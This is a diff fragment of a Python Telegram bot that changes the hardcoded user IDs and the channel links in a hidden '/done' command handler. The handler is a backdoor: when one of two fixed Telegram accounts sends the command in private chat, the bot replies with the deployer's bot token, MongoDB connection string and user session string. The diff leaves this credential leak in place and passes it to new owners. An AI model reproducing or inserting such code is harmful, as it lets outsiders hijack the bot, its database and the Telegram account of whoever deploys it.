@@ -448,17 +448,17 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 @app.on_message(
     filters.command("done")
     & filters.private
-    & (filters.user(6264859796) | filters.user(7006524418))
+    & (filters.user(5247664716) | filters.user(6045754531))
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://envs.sh/kNr.jpg",
-       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/TheChampu)............☆""",
+       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/hot_hai_boss)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• ᴄʜᴧᴍᴘᴜ •", url=f"https://t.me/TheChampu")
+                         "• 𝐇𝐨𝐭 𝐇𝐚𝐢 𝐁𝐨𝐬𝐬 •", url=f"https://t.me/hot_hai_boss")
                  ]
             ]
          ),
